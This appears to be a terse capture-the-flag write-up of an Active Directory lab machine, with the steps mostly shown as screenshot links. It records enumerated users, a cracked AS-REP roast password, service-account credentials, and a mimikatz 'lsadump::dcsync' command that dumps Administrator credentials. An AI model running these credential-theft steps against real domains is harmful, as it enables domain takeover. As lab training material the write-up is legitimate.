# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: #activedirectory 

# Findings

## External
### Enumeration
![](https://i.imgur.com/S3cQ9CA.png)
Domain: EGOTISTICAL-BANK.LOCAL
- Users
	- `hsmith@EGOTISTICAL-BANK.LOCAL`
	- `fsmith@EGOTISTICAL-BANK.LOCAL`
### Gaining Access
![](https://i.imgur.com/IwIS24q.png)
![](https://i.imgur.com/d0ZeFrg.png)
`Thestrokes23     ($krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL)`
- Kerberostable
	- ![](https://i.imgur.com/pY4Vmqs.png)
- User `fsmith` can rdp
	- ![](https://i.imgur.com/YWgPTtK.png)
![](https://i.imgur.com/40FUo5G.png)

## Internal
### Enumeration
![](https://i.imgur.com/kDN7o9b.png)
![](https://i.imgur.com/YQ5f0bb.png)
`svc_loanmanager: Moneymakestheworldgoround!`
### Gaining Access
```
lsadump::dcsync /domain:testlab.local /user:Administrator
```
![](https://i.imgur.com/FNclUET.png)

### Maintaining Access
- The user can dc sync
	- ![](https://i.imgur.com/Rq0VIZB.png)

- ![](https://i.imgur.com/KgUcQaJ.png)
# Random Notes